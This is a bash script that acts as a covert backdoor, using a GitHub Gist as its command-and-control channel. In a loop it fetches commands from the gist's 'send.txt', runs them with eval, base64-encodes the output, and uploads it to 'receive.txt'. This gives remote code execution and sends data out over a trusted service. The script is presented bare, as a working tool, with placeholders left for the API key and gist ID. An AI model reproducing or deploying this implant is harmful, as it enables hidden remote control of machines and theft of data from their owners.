#!/bin/bash

GITHUB_API_KEY=""
GIST_ID=""

while true
do
    COMMAND=$(curl -s -L \
  -H "Accept: application/vnd.github+json" \
  -H "Authorization: Bearer ${GITHUB_API_KEY}" \
  -H "X-GitHub-Api-Version: 2022-11-28" \
  https://api.github.com/gists/${GIST_ID} | \
    python2 -c "import sys, json; print json.load(sys.stdin)['files']['send.txt']['content']")
    if [[ "${COMMAND}" != "@" ]]; then # if there is a command then do this!
        output=$(eval ${COMMAND} | base64)
        curl -o /dev/null -L \
        -X PATCH \
        -H "Accept: application/vnd.github+json" \
        -H "Authorization: Bearer ${GITHUB_API_KEY}" \
        -H "X-GitHub-Api-Version: 2022-11-28" \
        https://api.github.com/gists/${GIST_ID} \
        -d '{"files":{"send.txt":{"content":"@"}}}'
        curl -o /dev/null -L \
        -X PATCH \
        -H "Accept: application/vnd.github+json" \
        -H "Authorization: Bearer ${GITHUB_API_KEY}" \
        -H "X-GitHub-Api-Version: 2022-11-28" \
        https://api.github.com/gists/${GIST_ID} \
        -d "{\"files\":{\"receive.txt\":{\"content\":\"${output}\"}}}"
    fi
sleep 1
done
